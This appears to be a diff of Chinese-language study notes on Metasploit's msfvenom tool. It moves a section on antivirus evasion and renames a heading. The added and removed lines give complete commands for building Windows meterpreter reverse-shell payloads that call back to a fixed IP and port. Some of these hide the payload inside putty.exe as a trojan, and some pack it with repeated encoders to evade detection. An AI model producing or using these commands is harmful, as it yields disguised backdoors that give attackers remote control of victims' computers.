@@ -21,19 +21,8 @@
 msfvenom -p <payload> LHOST=<ip addr> LPORT=<port> -f <format> -o exeutable.format
 
 注：
-0 这里是最简单的直接生成payload的命令，如果你要做免杀（相比于裸露的payload会好一点，但是实际上也免不了杀），有如下命令（选项的具体解释详见msfvenom高级）：
-（1）制作以putty.exe为载体的木马：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -x putty.exe -k -f exe -o p.exe
-（2）制作加壳病毒：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o p.exe
-（3）通过raw制作加壳病毒（使用encoder模块加壳（cmd/powershell_base64和x86/shikata_ga_nai（覆水难收）比较好））：
-第一步：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw -o p.bin
-第二步：msfvenom -p - < p.bin -a x64 --platform windows -e x64/xor_dynamic -i 5 -f exe -o p.exe
-注意：基于raw文件在制作可执行文件时也得看raw的payload（arch、platform）。
-（4）制作以putty.exe为载体的加壳木马：
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -x putty.exe -k -e x86/shikata_ga_nai -i 10 -f exe -o p.exe
-（5）通过raw制作以putty.exe为载体的加壳木马（使用encoder模块加壳（cmd/powershell_base64和x86/shikata_ga_nai（覆水难收）比较好））：
-第一步：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw -o p.bin
-第二步：msfvenom -p - < p.bin -a x64 --platform windows -x putty.exe -k -e x64/xor_dynamic -i 5 -f exe -o p.exe
-注意：基于raw文件在制作可执行文件时也得看raw的payload（arch、platform）。
+0 这里是最简单的直接生成payload的命令，如果你要做免杀（相比于裸露的payload会好一点，但是实际上也免不了杀），请详见后续。
+
 
 1 msfvenom是一个独立于msfconsole的工具，没必要非在msf环境中执行。
 
@@ -92,7 +81,7 @@ jobs -k <job_id>
 
 
 
-二 msfvenom高级
+二 msfvenom高级选项
 （一）-f概览
 1 Framework Executable Formats:
 asp, aspx：ASP.NET Web 应用程序格式
@@ -161,3 +150,37 @@ war：Java Web应用程序归档格式
 
 （十）< <file>
 导入文件
+
+
+
+
+
+
+
+三 免杀（是Windows免杀技术的一部分也是msf-post的一部分）
+（一）制作以putty.exe为载体的木马：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -x putty.exe -k -f exe -o p.exe
+
+
+
+（二）制作加壳病毒：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o p.exe
+注：cmd/powershell_base64和x86/shikata_ga_nai比较好。
+
+
+（三）通过raw制作加壳病毒：
+1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw -o p.bin
+
+2 msfvenom -p - < p.bin -a x64 --platform windows -e x64/xor_dynamic -i 5 -f exe -o p.exe
+注意：基于raw文件在制作可执行文件时也得看raw的payload（arch、platform）。
+
+
+
+（四）制作以putty.exe为载体的加壳木马：
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -x putty.exe -k -e x86/shikata_ga_nai -i 10 -f exe -o p.exe
+
+
+
+（五）通过raw制作以putty.exe为载体的加壳木马（使用encoder模块加壳（cmd/powershell_base64和x86/shikata_ga_nai（覆水难收）比较好））：
+1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw -o p.bin
+
+2 msfvenom -p - < p.bin -a x64 --platform windows -x putty.exe -k -e x64/xor_dynamic -i 5 -f exe -o p.exe
+注意：基于raw文件在制作可执行文件时也得看raw的payload（arch、platform）。
